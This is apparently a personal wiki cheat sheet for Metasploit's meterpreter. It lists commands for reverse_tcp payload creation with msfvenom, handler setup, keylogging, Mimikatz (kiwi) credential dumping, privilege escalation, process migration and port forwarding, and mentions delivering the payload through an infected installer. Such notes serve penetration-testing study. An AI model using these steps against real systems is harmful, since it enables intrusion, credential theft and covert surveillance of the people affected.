Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-19T18:00:41-05:00

====== meterpreter ======
Created Tuesday 19 October 2021


===== Commands =====
{{{code: lang="texinfo" linenumbers="False"
background												Puts this session in the background, returning to the msf-console
transport list											Lists all available transports
transport add -t <transport> -l <lhost> -p <lport>		Adds a reverse_tcp transport to the current sessions
transport:
	reverse_tcp											Use a reverse TCP connection



help													Displays available commands
sysinfo													Displays system information
getuid													Displays the username the shell is running on

pwd														Displays current path on target fs
ls														Lists files on target fs
cd														Changes directory on target fs

upload <localfile> <remotefile>							Uploads a file from local filesystem to remote filesystem. C:\<file> must be written as c:\\<file>
download <remotefile> <localfile>						Downloads a file. C:\\<file>

shell													Spawns a shell
exit													Exits shell and returns to meterpreter context
ps														Lists all processes
netstat													Shows connection information

screenshot												Makes a screenshot of target host

keyscan_start											Starts the keylogger
keyscan_dump											Dumps the logged keys to screen
keyscan_stop											Stops the keylogger

ps														Shows processlist
migrate <pid>											Migrates the shell from one process to process with <pid>

load <extension>										
extensions:
	powershell											Allow you to interact with the target system through powershell
	kiwi												Mimikatz implementation
	
-- Available after load powershell
powershell help	
powershell_execute         								Execute a Powershell command string
powershell_import          								Import a PS1 script or .NET Assembly DLL from the local filesystem
powershell_session_remove  								Remove/clear a session (other than default)
powershell_shell           								Create an interactive Powershell prompt. Exit with ctrl+c


-- Available after load kiwi
getsystem												Attempts to elevate the current user to NT\SYSTEM
creds_msv												Dumps credentials
---

portfwd add -l <lport> -p <rport> -r <host>				Sets up a local listener on <lport> that forwards traffic to <host>:<rport>




}}}



===== Create meterpreter payload =====
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f <type>
}}}

* Create meterpreter payload for windows

{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f <type>
}}}

* Create meterpreter payload for windows

{{{code: lang="sh" linenumbers="False"
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f <type>
}}}

* Create meterpreter for x64 Linux


===== Setup handler =====
* Open msfconsole
{{{code: lang="sh" linenumbers="False"
msfconsole
}}}


* Select handler
{{{code: lang="sh" linenumbers="False"
msf > use exploit/multi/handler
}}}


* Set correct payload
{{{code: lang="sh" linenumbers="False"
msf > set PAYLOAD <payload>  # Same as the value for the -p flag when creating
}}}


* Set the correct ip for the payload to connect back to
{{{code: lang="sh" linenumbers="False"
msfv > set LHOST <ip>
}}}



* Optionally set a process migrator. This will transfer the shell on the target to a different process upon connection. 
* This is useful when a process that connects back to the host terminates. For instance an infected installer that terminates after installation.
{{{code: lang="sh" linenumbers="False"
set AutoRunScript post/windows/manage/migrate
}}}


===== Transports =====
It is possible to change the transport after the connection has been establikshed.
* First, you'll need  to specify which transporter to use in the meterpreter session itself.
* Then, you need to background the session, and setup a handler using the paylad, <lhost> and <lport> specs corresponding to the transport you've chosen.
* Run this command as  a job,
* Ineract with the original session
* Issue next transport command
* A new session will start and the old one will be closed
* Interact with the new session

===== Keylogging =====
* The keylogger can be controlled with keyscan_[start|dump|stop]
* When a user ctrl+c + ctrl+v's a password for instances, only the copy+paste commands show up, not the actual password


===== Extensions =====

==== powershell ====
* Use the load powershell command to interact with the windows system through powersell

==== kiwi ====
* Mimikatz implementation for meterpreter






